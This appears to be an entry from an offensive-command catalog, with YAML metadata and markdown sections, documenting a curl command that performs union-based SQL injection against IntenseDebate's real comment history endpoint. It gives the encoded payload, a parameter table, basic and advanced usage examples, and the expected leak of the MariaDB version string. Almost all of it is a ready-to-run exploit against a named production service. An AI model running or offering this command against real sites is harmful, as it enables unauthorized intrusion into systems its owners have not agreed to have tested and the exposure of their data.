---
data: >-
  curl
  "https://intensedebate.com/commenthistory/$YourSiteId%20union%20select%201,2,@@VERSION%23"
tags:
  - sqli
  - web
  - curl
type: command
output: >-
  HTML response containing database version '10.1.32-MariaDB' in the page
  content.
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.459Z'
id: 246cddc8-91a8-466c-98ed-a262cdafd5b5
verified: false
validated: true
submitted: true
---
# curl-intensedebate-sqli

## Command

```bash
curl "https://intensedebate.com/commenthistory/$YourSiteId%20union%20select%201,2,@@VERSION%23"
```

## Description

This command uses curl to send an HTTP GET request to the vulnerable IntenseDebate comment history endpoint with a URL-encoded union-based SQL injection payload, triggering the exploitation and returning the response with leaked database information.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$YourSiteId` | The numeric site ID obtained from the dashboard, placed before the payload | Yes |
| `%20union%20select%201,2,@@VERSION%23` | Encoded SQL payload: space-union-select constants and version query, terminated by comment | Yes |

## Examples

### Basic Usage

```bash
curl "https://intensedebate.com/commenthistory/12345%20union%20select%201,2,@@VERSION%23"
```

### Advanced Usage

```bash
curl -s "https://intensedebate.com/commenthistory/12345%20union%20select%201,2,@@VERSION%23" | grep -i mariadb
```

## Expected Output

The command outputs the full HTML response from the server, where the injected query results in the database version '10.1.32-MariaDB' appearing as part of the comment history table or content, confirming successful SQL injection.

## Related

- [[Related Procedure: Inject-Union-Based-SQL-Payload]]
